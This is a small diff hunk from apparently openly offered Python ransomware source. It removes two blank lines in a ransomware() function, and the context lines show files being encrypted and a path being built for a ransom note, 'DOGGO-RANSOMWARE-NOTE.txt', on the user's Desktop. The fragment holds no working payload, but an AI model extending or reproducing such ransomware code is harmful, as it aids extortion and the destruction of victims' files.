@@ -175,8 +175,6 @@ def ransomware():
     del cipher_suite
     encrypted_files()
 
-    
-
     try:
         desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
         file_path = os.path.join(desktop, 'DOGGO-RANSOMWARE-NOTE.txt')
